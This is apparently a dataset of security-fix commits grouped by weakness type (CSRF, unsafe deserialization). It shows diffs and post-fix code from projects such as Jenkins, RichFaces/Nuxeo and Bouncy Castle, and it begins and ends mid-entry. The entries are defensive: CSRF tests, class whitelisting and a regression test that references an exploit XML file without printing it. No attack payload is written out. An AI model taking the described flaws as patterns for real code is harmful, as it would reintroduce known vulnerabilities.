    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
  <c:if test="${model.foreignSource == null}">
    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
</h5>

  <ul class="list-inline">
    <c:url var="eventLink" value="event/list">
      <c:param name="filter" value="node=${model.id}"/>
    </c:url>
    <li class="list-inline-item">
      <a href="<c:out value="${eventLink}"/>">View Events</a>
    </li>



--------------------
Filename: ErrorType.java
Message: fix #107 csrf

Diff: @@ -57,6 +57,8 @@ public enum ErrorType {
 
     USER_NOT_EXIST(4041),//客户端不存在
 
+    STATE_ERROR(4042), //stat错误
+
     ACCESS_DENIED(503), //访问被拒绝
 
     OTHER(5001), //其他错误 ;

Code after:
    UNSUPPORTED_GRANT_TYPE(4013), //不支持的认证类型
    UNSUPPORTED_RESPONSE_TYPE(4014), //不支持的响应类型

    EXPIRED_CODE(4015), //AUTHORIZATION_CODE过期
    EXPIRED_REFRESH_TOKEN(4020), //REFRESH_TOKEN过期

    CLIENT_DISABLED(4016),//客户端已被禁用

    CLIENT_NOT_EXIST(4040),//客户端不存在

    USER_NOT_EXIST(4041),//客户端不存在

    STATE_ERROR(4042), //stat错误

    ACCESS_DENIED(503), //访问被拒绝

    OTHER(5001), //其他错误 ;

    PARSE_RESPONSE_ERROR(5002),//解析返回结果错误

    SERVICE_ERROR(5003); //服务器返回错误信息


    private final String message;
    private final int    code;
    static final Map<Integer, ErrorType> codeMapping = Arrays.stream(ErrorType.values())
            .collect(Collectors.toMap(ErrorType::code, type -> type));



--------------------
Filename: CsrfDirectivesTest.java
Message: Fix CSRF protection bypass #74

Diff: @@ -135,6 +135,33 @@ public class CsrfDirectivesTest extends HttpSessionAwareDirectivesTest {
 
     }
 
+    @Test
+    public void shouldRejectRequestsIfTheCsrfCookieAndTheHeaderAreEmpty() {
+        // given
+        final Route route = createCsrfRouteWithCheckHeaderMode();
+
+        // when
+        TestRouteResult testRouteResult = testRoute(route)
+          .run(HttpRequest.GET("/site"));
+
+        // then
+        testRouteResult
+          .assertStatusCode(StatusCodes.OK);
+
+        /* second request */
+        // when
+        TestRouteResult testRouteResult2 = testRoute(route)
+          .run(HttpRequest.POST("/transfer_money")
+            .addHeader(Cookie.create(csrfCookieName, ""))
+            .addHeader(RawHeader.create(csrfSubmittedName, ""))
+          );
+
+        // then
+        testRouteResult2
+          .assertStatusCode(StatusCodes.FORBIDDEN);
+
+    }
+
     @Test
     public void shouldAcceptRequestsIfTheCsrfCookieMatchesTheHeaderValue() {
         // given

Code after:
        /* second request */
        // when
        TestRouteResult testRouteResult2 = testRoute(route)
            .run(HttpRequest.POST("/transfer_money"));

        // then
        testRouteResult2
            .assertStatusCode(StatusCodes.FORBIDDEN);


    }

    @Test
    public void shouldRejectRequestsIfTheCsrfCookieAndTheHeaderAreEmpty() {
        // given
        final Route route = createCsrfRouteWithCheckHeaderMode();

        // when
        TestRouteResult testRouteResult = testRoute(route)
          .run(HttpRequest.GET("/site"));

        // then
        testRouteResult
          .assertStatusCode(StatusCodes.OK);

        /* second request */
        // when
        TestRouteResult testRouteResult2 = testRoute(route)
          .run(HttpRequest.POST("/transfer_money")
            .addHeader(Cookie.create(csrfCookieName, ""))
            .addHeader(RawHeader.create(csrfSubmittedName, ""))
          );

        // then
        testRouteResult2
          .assertStatusCode(StatusCodes.FORBIDDEN);

    }

    @Test
    public void shouldAcceptRequestsIfTheCsrfCookieMatchesTheHeaderValue() {
        // given
        final Route route = createCsrfRouteWithCheckHeaderMode();

        // when
        TestRouteResult testRouteResult = testRoute(route)
            .run(HttpRequest.GET("/site"));

        // then
        testRouteResult
            .assertStatusCode(StatusCodes.OK);

        // and


--------------------
Filename: BackupConfigControllerV1.java
Message: #000 - Add missing Content-Type check

Diff: @@ -65,7 +65,9 @@ public class BackupConfigControllerV1 extends ApiController implements SparkSpri
     public void setupRoutes() {
         path(controllerBasePath(), () -> {
             before("", mimeType, this::setContentType);
-
+            before("/*", mimeType, this::setContentType);
+            before("", mimeType, this::verifyContentType);
+            before("/*", mimeType, this::verifyContentType);
 
             // change the line below to enable appropriate security
             before("", mimeType, this.apiAuthenticationHelper::checkAdminUserAnd403);

Code after:
        this.goConfigService = goConfigService;
    }

    @Override
    public String controllerBasePath() {
        return Routes.BackupConfig.BASE;
    }

    @Override
    public void setupRoutes() {
        path(controllerBasePath(), () -> {
            before("", mimeType, this::setContentType);
            before("/*", mimeType, this::setContentType);
            before("", mimeType, this::verifyContentType);
            before("/*", mimeType, this::verifyContentType);

            // change the line below to enable appropriate security
            before("", mimeType, this.apiAuthenticationHelper::checkAdminUserAnd403);

            get("", mimeType, this::show);

            post("", mimeType, this::createOrUpdate);
            put("", mimeType, this::createOrUpdate);

            delete("", mimeType, this::deleteBackupConfig);
        });
    }

    public String show(Request req, Response res) throws IOException {


--------------------
Filename: Security.php
Message: Improved CSRF protection

Diff: @@ -151,6 +151,9 @@ class Security
 	/** Enable CSRF protection */
 	public static $csrfActive = true;
 
+	/** Default expire time of CSRF token in seconds */
+	public static $csrfLifetimeToken = 28800;
+
 	/** Enable verified frame protection, used in CSRF */
 	public static $csrfFrameBreaker = true;
 

Code after:
	/** Redirect to proper url when wrong url is entered. */
	public static $forceUrlRedirection = true;

	/**
	 * HTTP Public-Key-Pins (HPKP) pin-sha256 For HPKP to work properly at least 2 keys are needed.
	 * https://scotthelme.co.uk/hpkp-http-public-key-pinning/, https://sekurak.pl/mechanizm-http-public-key-pinning/.
	 */
	public static $hpkpKeysHeader = [];

	/** Enable CSRF protection */
	public static $csrfActive = true;

	/** Default expire time of CSRF token in seconds */
	public static $csrfLifetimeToken = 28800;

	/** Enable verified frame protection, used in CSRF */
	public static $csrfFrameBreaker = true;

	/** Which window should be verified? It is used to check if the system is loaded in the frame, used in CSRF. */
	public static $csrfFrameBreakerWindow = 'top';

	/** HTTP Content Security Policy response header allows website administrators to control resources the user agent is allowed to load for a given page */
	public static $cspHeaderActive = true;

	/** HTTP Content Security Policy time interval for generating a new nonce token */
	public static $cspHeaderTokenTime = '5 minutes';

	/** Allowed domains for loading images, used in CSP. */
	public static $allowedImageDomains = [];


--------------------

********************
CWE-502: Deserialization of Untrusted Data (26 samples)
********************
Filename: XStream2Security383Test.java
Message: Merge pull request #101 from jenkinsci-cert/security-383-simpler

[SECURITY-383] Additional XStream2-specific class blacklisting

Diff: @@ -0,0 +1,120 @@
+package hudson.util;
+
+import hudson.model.Items;
+import org.apache.commons.io.FileUtils;
+import org.apache.commons.io.IOUtils;
+import org.junit.Before;
+import org.junit.Rule;
+import org.junit.Test;
+import org.junit.rules.TemporaryFolder;
+import org.jvnet.hudson.test.Issue;
+import org.jvnet.hudson.test.JenkinsRule;
+import org.kohsuke.stapler.StaplerRequest;
+import org.kohsuke.stapler.StaplerResponse;
+import org.mockito.Mock;
+import org.mockito.MockitoAnnotations;
+
+import javax.servlet.ServletInputStream;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+
+import static org.junit.Assert.assertFalse;
+import static org.mockito.Mockito.when;
+
+public class XStream2Security383Test {
+
+    @Rule
+    public JenkinsRule j = new JenkinsRule();
+
+    @Rule
+    public TemporaryFolder f = new TemporaryFolder();
+
+    @Mock
+    private StaplerRequest req;
+
+    @Mock
+    private StaplerResponse rsp;
+
+    @Before
+    public void setUp() throws Exception {
+        MockitoAnnotations.initMocks(this);
+    }
+
+    @Test
+    @Issue("SECURITY-383")
+    public void testXmlLoad() throws Exception {
+        File exploitFile = f.newFile();
+        try {
+            // be extra sure there's no file already
+            if (exploitFile.exists() && !exploitFile.delete()) {
+                throw new IllegalStateException("file exists and cannot be deleted");
+            }
+            File tempJobDir = new File(j.jenkins.getRootDir(), "security383");
+
+            String exploitXml = IOUtils.toString(
+                    XStream2Security383Test.class.getResourceAsStream(
+                            "/hudson/util/XStream2Security383Test/config.xml"), "UTF-8");
+
+            exploitXml = exploitXml.replace("@TOKEN@", exploitFile.getAbsolutePath());
+
+            FileUtils.write(new File(tempJobDir, "config.xml"), exploitXml);
+
+            try {
+                Items.load(j.jenkins, tempJobDir);
+            } catch (Exception e) {
+                // ignore
+            }
+            assertFalse("no file should be created here", exploitFile.exists());
+        } finally {
+            exploitFile.delete();
+        }
+    }
+
+    @Test
+    @Issue("SECURITY-383")
+    public void testPostJobXml() throws Exception {
+        File exploitFile = f.newFile();
+        try {
+            // be extra sure there's no file already
+            if (exploitFile.exists() && !exploitFile.delete()) {
+                throw new IllegalStateException("file exists and cannot be deleted");
+            }
+            File tempJobDir = new File(j.jenkins.getRootDir(), "security383");
+
+            String exploitXml = IOUtils.toString(
+                    XStream2Security383Test.class.getResourceAsStream(
+                            "/hudson/util/XStream2Security383Test/config.xml"), "UTF-8");
+
+            exploitXml = exploitXml.replace("@TOKEN@", exploitFile.getAbsolutePath());
+
+            when(req.getMethod()).thenReturn("POST");
+            when(req.getInputStream()).thenReturn(new Stream(IOUtils.toInputStream(exploitXml)));
+            when(req.getContentType()).thenReturn("application/xml");
+            when(req.getParameter("name")).thenReturn("foo");
+
+            try {
+                j.jenkins.doCreateItem(req, rsp);
+            } catch (Exception e) {
+                // don't care
+            }
+
+            assertFalse("no file should be created here", exploitFile.exists());
+        } finally {
+            exploitFile.delete();
+        }
+    }
+
+    private static class Stream extends ServletInputStream {
+        private final InputStream inner;
+
+        public Stream(final InputStream inner) {
+            this.inner = inner;
+        }
+
+        @Override
+        public int read() throws IOException {
+            return inner.read();
+        }
+    }
+}

Code after:
package hudson.util;

import hudson.model.Items;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;
import org.kohsuke.stapler.StaplerRequest;
import org.kohsuke.stapler.StaplerResponse;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;

import javax.servlet.ServletInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;

import static org.junit.Assert.assertFalse;
import static org.mockito.Mockito.when;

public class XStream2Security383Test {

    @Rule
    public JenkinsRule j = new JenkinsRule();

    @Rule
    public TemporaryFolder f = new TemporaryFolder();

    @Mock
    private StaplerRequest req;

    @Mock
    private StaplerResponse rsp;

    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }

    @Test
    @Issue("SECURITY-383")
    public void testXmlLoad() throws Exception {
        File exploitFile = f.newFile();
        try {
            // be extra sure there's no file already
            if (exploitFile.exists() && !exploitFile.delete()) {
                throw new IllegalStateException("file exists and cannot be deleted");
            }
            File tempJobDir = new File(j.jenkins.getRootDir(), "security383");

            String exploitXml = IOUtils.toString(
                    XStream2Security383Test.class.getResourceAsStream(
                            "/hudson/util/XStream2Security383Test/config.xml"), "UTF-8");

            exploitXml = exploitXml.replace("@TOKEN@", exploitFile.getAbsolutePath());

            FileUtils.write(new File(tempJobDir, "config.xml"), exploitXml);

            try {
                Items.load(j.jenkins, tempJobDir);
            } catch (Exception e) {
                // ignore
            }
            assertFalse("no file should be created here", exploitFile.exists());
        } finally {
            exploitFile.delete();
        }
    }

    @Test
    @Issue("SECURITY-383")
    public void testPostJobXml() throws Exception {
        File exploitFile = f.newFile();
        try {
            // be extra sure there's no file already
            if (exploitFile.exists() && !exploitFile.delete()) {
                throw new IllegalStateException("file exists and cannot be deleted");
            }
            File tempJobDir = new File(j.jenkins.getRootDir(), "security383");

            String exploitXml = IOUtils.toString(
                    XStream2Security383Test.class.getResourceAsStream(
                            "/hudson/util/XStream2Security383Test/config.xml"), "UTF-8");

            exploitXml = exploitXml.replace("@TOKEN@", exploitFile.getAbsolutePath());

            when(req.getMethod()).thenReturn("POST");
            when(req.getInputStream()).thenReturn(new Stream(IOUtils.toInputStream(exploitXml)));
            when(req.getContentType()).thenReturn("application/xml");
            when(req.getParameter("name")).thenReturn("foo");

            try {
                j.jenkins.doCreateItem(req, rsp);
            } catch (Exception e) {
                // don't care
            }

            assertFalse("no file should be created here", exploitFile.exists());
        } finally {
            exploitFile.delete();
        }
    }

    private static class Stream extends ServletInputStream {
        private final InputStream inner;

        public Stream(final InputStream inner) {
            this.inner = inner;
        }

        @Override
        public int read() throws IOException {
            return inner.read();
        }
    }
}


--------------------
Filename: LookAheadObjectInputStream.java
Message: NXBT-661: apply patch for CVE-2013-4521 flaw

Diff: @@ -0,0 +1,148 @@
+/**
+ * JBoss, Home of Professional Open Source
+ * Copyright 2010, Red Hat, Inc. and individual contributors
+ * by the @authors tag. See the copyright.txt in the distribution for a
+ * full listing of individual contributors.
+ *
+ * This is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as
+ * published by the Free Software Foundation; either version 2.1 of
+ * the License, or (at your option) any later version.
+ *
+ * This software is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * Lesser General Public License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public
+ * License along with this software; if not, write to the Free
+ * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
+ * 02110-1301 USA, or see the FSF site: http://www.fsf.org.
+ **/
+package org.ajax4jsf.resource;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InvalidClassException;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Properties;
+import java.util.Set;
+import java.util.concurrent.ConcurrentHashMap;
+
+/**
+ * When deserializing objects, first check that the class being deserialized is in the allowed whitelist.
+ *
+ * @author <a href="http://community.jboss.org/people/bleathem">Brian Leathem</a>
+ */
+public class LookAheadObjectInputStream extends ObjectInputStream {
+    private static final Map<String, Class<?>> PRIMITIVE_TYPES = new HashMap<String, Class<?>>(9, 1.0F);
+    private static Set<Class> whitelistBaseClasses = new HashSet<Class>();
+    private static Set<String> whitelistClassNameCache = Collections.newSetFromMap(new ConcurrentHashMap<String, Boolean>());
+
+    static {
+        PRIMITIVE_TYPES.put("bool", Boolean.TYPE);
+        PRIMITIVE_TYPES.put("byte", Byte.TYPE);
+        PRIMITIVE_TYPES.put("char", Character.TYPE);
+        PRIMITIVE_TYPES.put("short", Short.TYPE);
+        PRIMITIVE_TYPES.put("int", Integer.TYPE);
+        PRIMITIVE_TYPES.put("long", Long.TYPE);
+        PRIMITIVE_TYPES.put("float", Float.TYPE);
+        PRIMITIVE_TYPES.put("double", Double.TYPE);
+        PRIMITIVE_TYPES.put("void", Void.TYPE);
+
+        whitelistClassNameCache.add(new Object[0].getClass().getName());
+        whitelistClassNameCache.add(new String[0].getClass().getName());
+        whitelistClassNameCache.add(new Boolean[0].getClass().getName());
+        whitelistClassNameCache.add(new Byte[0].getClass().getName());
+        whitelistClassNameCache.add(new Character[0].getClass().getName());
+        whitelistClassNameCache.add(new Short[0].getClass().getName());
+        whitelistClassNameCache.add(new Integer[0].getClass().getName());
+        whitelistClassNameCache.add(new Long[0].getClass().getName());
+        whitelistClassNameCache.add(new Float[0].getClass().getName());
+        whitelistClassNameCache.add(new Double[0].getClass().getName());
+        whitelistClassNameCache.add(new Void[0].getClass().getName());
+
+        whitelistBaseClasses.add(String.class);
+        whitelistBaseClasses.add(Boolean.class);
+        whitelistBaseClasses.add(Byte.class);
+        whitelistBaseClasses.add(Character.class);
+        whitelistBaseClasses.add(Number.class);
+
+        loadWhitelist();
+    }
+
+    public LookAheadObjectInputStream(InputStream in) throws IOException {
+        super(in);
+    }
+
+    /**
+     * Only deserialize primitive or whitelisted classes
+     */
+    @Override
+    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+        Class<?> primitiveType = PRIMITIVE_TYPES.get(desc.getName());
+        if (primitiveType != null) {
+            return primitiveType;
+        }
+        if (!isClassValid(desc.getName())) {
+            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
+        }
+        return super.resolveClass(desc);
+    }
+
+    /**
+     * Determine if the given requestedClassName is allowed by the whitelist
+     */
+    boolean isClassValid(String requestedClassName) {
+        if (whitelistClassNameCache.contains(requestedClassName)) {
+            return true;
+        }
+        try {
+            Class<?> requestedClass = Class.forName(requestedClassName);
+            for (Class baseClass : whitelistBaseClasses ) {
+                if (baseClass.isAssignableFrom(requestedClass)) {
+                    whitelistClassNameCache.add(requestedClassName);
+                    return true;
+                }
+            }
+        } catch (ClassNotFoundException e) {
+            return false;
+        }
+        return false;
+    }
+
+    /**
+     * Load the whitelist from the properties file
+     */
+    static void loadWhitelist() {
+        Properties whitelistProperties = new Properties();
+        InputStream stream = null;
+        try {
+            stream =  LookAheadObjectInputStream.class.getResourceAsStream("resource-serialization.properties");
+            whitelistProperties.load(stream);
+        } catch (IOException e) {
+            throw new RuntimeException("Error loading the ResourceBuilder.properties file", e);
+        } finally {
+            if (stream != null) {
+                try {
+                    stream.close();
+                } catch (IOException e) {
+                    throw new RuntimeException("Error closing the ResourceBuilder.properties file", e);
+                }
+            }
+        }
+        for (String baseClassName : whitelistProperties.getProperty("whitelist").split(",")) {
+            try {
+                Class<?> baseClass = Class.forName(baseClassName);
+                whitelistBaseClasses.add(baseClass);
+            } catch (ClassNotFoundException e) {
+                throw new RuntimeException("Unable to load whiteList class " + baseClassName, e);
+            }
+        }
+    }
+}

Code after:
/**
 * JBoss, Home of Professional Open Source
 * Copyright 2010, Red Hat, Inc. and individual contributors
 * by the @authors tag. See the copyright.txt in the distribution for a
 * full listing of individual contributors.
 *
 * This is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2.1 of
 * the License, or (at your option) any later version.
 *
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this software; if not, write to the Free
 * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 * 02110-1301 USA, or see the FSF site: http://www.fsf.org.
 **/
package org.ajax4jsf.resource;

import java.io.IOException;
import java.io.InputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

/**
 * When deserializing objects, first check that the class being deserialized is in the allowed whitelist.
 *
 * @author <a href="http://community.jboss.org/people/bleathem">Brian Leathem</a>
 */
public class LookAheadObjectInputStream extends ObjectInputStream {
    private static final Map<String, Class<?>> PRIMITIVE_TYPES = new HashMap<String, Class<?>>(9, 1.0F);
    private static Set<Class> whitelistBaseClasses = new HashSet<Class>();
    private static Set<String> whitelistClassNameCache = Collections.newSetFromMap(new ConcurrentHashMap<String, Boolean>());

    static {
        PRIMITIVE_TYPES.put("bool", Boolean.TYPE);
        PRIMITIVE_TYPES.put("byte", Byte.TYPE);
        PRIMITIVE_TYPES.put("char", Character.TYPE);
        PRIMITIVE_TYPES.put("short", Short.TYPE);
        PRIMITIVE_TYPES.put("int", Integer.TYPE);
        PRIMITIVE_TYPES.put("long", Long.TYPE);
        PRIMITIVE_TYPES.put("float", Float.TYPE);
        PRIMITIVE_TYPES.put("double", Double.TYPE);
        PRIMITIVE_TYPES.put("void", Void.TYPE);

        whitelistClassNameCache.add(new Object[0].getClass().getName());
        whitelistClassNameCache.add(new String[0].getClass().getName());
        whitelistClassNameCache.add(new Boolean[0].getClass().getName());
        whitelistClassNameCache.add(new Byte[0].getClass().getName());
        whitelistClassNameCache.add(new Character[0].getClass().getName());
        whitelistClassNameCache.add(new Short[0].getClass().getName());
        whitelistClassNameCache.add(new Integer[0].getClass().getName());
        whitelistClassNameCache.add(new Long[0].getClass().getName());
        whitelistClassNameCache.add(new Float[0].getClass().getName());
        whitelistClassNameCache.add(new Double[0].getClass().getName());
        whitelistClassNameCache.add(new Void[0].getClass().getName());

        whitelistBaseClasses.add(String.class);
        whitelistBaseClasses.add(Boolean.class);
        whitelistBaseClasses.add(Byte.class);
        whitelistBaseClasses.add(Character.class);
        whitelistBaseClasses.add(Number.class);

        loadWhitelist();
    }

    public LookAheadObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    /**
     * Only deserialize primitive or whitelisted classes
     */
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        Class<?> primitiveType = PRIMITIVE_TYPES.get(desc.getName());
        if (primitiveType != null) {
            return primitiveType;
        }
        if (!isClassValid(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }

    /**
     * Determine if the given requestedClassName is allowed by the whitelist
     */
    boolean isClassValid(String requestedClassName) {
        if (whitelistClassNameCache.contains(requestedClassName)) {
            return true;
        }
        try {
            Class<?> requestedClass = Class.forName(requestedClassName);
            for (Class baseClass : whitelistBaseClasses ) {
                if (baseClass.isAssignableFrom(requestedClass)) {
                    whitelistClassNameCache.add(requestedClassName);
                    return true;
                }
            }
        } catch (ClassNotFoundException e) {
            return false;
        }
        return false;
    }

    /**
     * Load the whitelist from the properties file
     */
    static void loadWhitelist() {
        Properties whitelistProperties = new Properties();
        InputStream stream = null;
        try {
            stream =  LookAheadObjectInputStream.class.getResourceAsStream("resource-serialization.properties");
            whitelistProperties.load(stream);
        } catch (IOException e) {
            throw new RuntimeException("Error loading the ResourceBuilder.properties file", e);
        } finally {
            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException e) {
                    throw new RuntimeException("Error closing the ResourceBuilder.properties file", e);
                }
            }
        }
        for (String baseClassName : whitelistProperties.getProperty("whitelist").split(",")) {
            try {
                Class<?> baseClass = Class.forName(baseClassName);
                whitelistBaseClasses.add(baseClass);
            } catch (ClassNotFoundException e) {
                throw new RuntimeException("Unable to load whiteList class " + baseClassName, e);
            }
        }
    }
}


--------------------
Filename: ResourceBuilderImpl.java
Message: NXBT-661: apply patch for CVE-2013-4521 flaw

Diff: @@ -374,8 +374,7 @@ public class ResourceBuilderImpl extends InternetResourceBuilder {
 				data = objectArray;
 			} else {
 				try {
-					ObjectInputStream in = new ObjectInputStream(
-							new ByteArrayInputStream(objectArray));
+					ObjectInputStream in = new LookAheadObjectInputStream(new ByteArrayInputStream(objectArray));
 					data = in.readObject();
 				} catch (StreamCorruptedException e) {
 					log.error(Messages

Code after:
			byte[] objectArray = null;
			byte[] dataArray;
			try {
				dataArray = dataString.getBytes("ISO-8859-1");
				objectArray = decrypt(dataArray);
			} catch (UnsupportedEncodingException e1) {
				// default encoding always presented.
			}
			if ("B".equals(matcher.group(1))) {
				data = objectArray;
			} else {
				try {
					ObjectInputStream in = new LookAheadObjectInputStream(new ByteArrayInputStream(objectArray));
					data = in.readObject();
				} catch (StreamCorruptedException e) {
					log.error(Messages
							.getMessage(Messages.STREAM_CORRUPTED_ERROR), e);
				} catch (IOException e) {
					log.error(Messages
							.getMessage(Messages.DESERIALIZE_DATA_INPUT_ERROR),
							e);
				} catch (ClassNotFoundException e) {
					log
							.error(
									Messages
											.getMessage(Messages.DATA_CLASS_NOT_FOUND_ERROR),
									e);
				}


--------------------
Filename: UserResource.java
Message: NXBT-661: apply patch for CVE-2013-4521 flaw

Diff: @@ -156,7 +156,7 @@ public class UserResource extends InternetResourceBase {
 		return true;
 	}
 	
-	public static class UriData implements Serializable {
+	public static class UriData implements SerializableResource {
 
 		/**
 		 * 

Code after:
		}
		}
		return super.getExpired(resourceContext);
	}
	/* (non-Javadoc)
	 * @see org.ajax4jsf.resource.InternetResourceBase#requireFacesContext()
	 */
	public boolean requireFacesContext() {
		// TODO Auto-generated method stub
		return true;
	}
	
	public static class UriData implements SerializableResource {

		/**
		 * 
		 */
		private static final long serialVersionUID = 1258987L;
		
		private Object value;
		
		private Object createContent;
		
		private Object expires;
		
		private Object modified;
	}


--------------------
Filename: BCXMSSMTPrivateKey.java
Message: added additional checking to XMSS BDS tree parsing. Failures now mostly cause IOException

Diff: @@ -52,7 +52,7 @@ public BCXMSSMTPrivateKey(PrivateKeyInfo keyInfo)
 
             if (xmssMtPrivateKey.getBdsState() != null)
             {
-                keyBuilder.withBDSState((BDSStateMap)XMSSUtil.deserialize(xmssMtPrivateKey.getBdsState()));
+                keyBuilder.withBDSState((BDSStateMap)XMSSUtil.deserialize(xmssMtPrivateKey.getBdsState(), BDSStateMap.class));
             }
 
             this.keyParams = keyBuilder.build();

Code after:
        try
        {
            XMSSMTPrivateKeyParameters.Builder keyBuilder = new XMSSMTPrivateKeyParameters
                .Builder(new XMSSMTParameters(keyParams.getHeight(), keyParams.getLayers(), DigestUtil.getDigest(treeDigest)))
                .withIndex(xmssMtPrivateKey.getIndex())
                .withSecretKeySeed(xmssMtPrivateKey.getSecretKeySeed())
                .withSecretKeyPRF(xmssMtPrivateKey.getSecretKeyPRF())
                .withPublicSeed(xmssMtPrivateKey.getPublicSeed())
                .withRoot(xmssMtPrivateKey.getRoot());

            if (xmssMtPrivateKey.getBdsState() != null)
            {
                keyBuilder.withBDSState((BDSStateMap)XMSSUtil.deserialize(xmssMtPrivateKey.getBdsState(), BDSStateMap.class));
            }

            this.keyParams = keyBuilder.build();
        }
        catch (ClassNotFoundException e)
        {
            throw new IOException("ClassNotFoundException processing BDS state: " + e.getMessage());
        }
    }

    public String getAlgorithm()
    {
        return "XMSSMT";
    }


--------------------
Filename: BCXMSSPrivateKey.java
Message: added additional checking to XMSS BDS tree parsing. Failures now mostly cause IOException

Diff: @@ -51,7 +51,7 @@ public BCXMSSPrivateKey(PrivateKeyInfo keyInfo)
 
             if (xmssPrivateKey.getBdsState() != null)
             {
-                keyBuilder.withBDSState((BDS)XMSSUtil.deserialize(xmssPrivateKey.getBdsState()));
+                keyBuilder.withBDSState((BDS)XMSSUtil.deserialize(xmssPrivateKey.getBdsState(), BDS.class));
             }
 
             this.keyParams = keyBuilder.build();

Code after:
        try
        {
            XMSSPrivateKeyParameters.Builder keyBuilder = new XMSSPrivateKeyParameters
                .Builder(new XMSSParameters(keyParams.getHeight(), DigestUtil.getDigest(treeDigest)))
                .withIndex(xmssPrivateKey.getIndex())
                .withSecretKeySeed(xmssPrivateKey.getSecretKeySeed())
                .withSecretKeyPRF(xmssPrivateKey.getSecretKeyPRF())
                .withPublicSeed(xmssPrivateKey.getPublicSeed())
                .withRoot(xmssPrivateKey.getRoot());

            if (xmssPrivateKey.getBdsState() != null)
            {
                keyBuilder.withBDSState((BDS)XMSSUtil.deserialize(xmssPrivateKey.getBdsState(), BDS.class));
            }

            this.keyParams = keyBuilder.build();
        }
        catch (ClassNotFoundException e)
        {
            throw new IOException("ClassNotFoundException processing BDS state: " + e.getMessage());
        }
    }

    public String getAlgorithm()
    {
        return "XMSS";
    }


--------------------
Filename: JsonParserBase.java
Message: Added `allowClass` (closes #628)

Diff: @@ -55,6 +55,7 @@ public abstract class JsonParserBase {
 
 	protected Supplier<Map> mapSupplier = HASMAP_SUPPLIER;
 	protected Supplier<List> listSupplier = ARRAYLIST_SUPPLIER;
+	protected List<String> classnameWhitelist;
 
 	/**
 	 * Creates new instance of {@link jodd.json.MapToBean}.

Code after:
 * various utilities, to reduce the size of a parser.
 */
public abstract class JsonParserBase {

	protected static final Supplier<Map> HASMAP_SUPPLIER = LinkedHashMap::new;
	protected static final Supplier<Map> LAZYMAP_SUPPLIER = LazyMap::new;

	protected static final Supplier<List> ARRAYLIST_SUPPLIER = ArrayList::new;
	protected static final Supplier<List> LAZYLIST_SUPPLIER = LazyList::new;

	protected Supplier<Map> mapSupplier = HASMAP_SUPPLIER;
	protected Supplier<List> listSupplier = ARRAYLIST_SUPPLIER;
	protected List<String> classnameWhitelist;

	/**
	 * Creates new instance of {@link jodd.json.MapToBean}.
	 */
	protected MapToBean createMapToBean(final String classMetadataName) {
		return new MapToBean(this, classMetadataName);
	}

	// ---------------------------------------------------------------- object tools

	/**
	 * Creates new type for JSON array objects.
	 * It returns a collection.
	 * Later, the collection will be converted into the target type.


--------------------
Filename: CVE-2021-29505.html
Message: Add description of CVE-2021-29505 and bug fix.

Diff: @@ -0,0 +1,119 @@
+<html>
+<!--
+ Copyright (C) 2021 XStream committers.
+ All rights reserved.
+ 
+ The software in this package is published under the terms of the BSD
+ style license a copy of which has been included with this distribution in
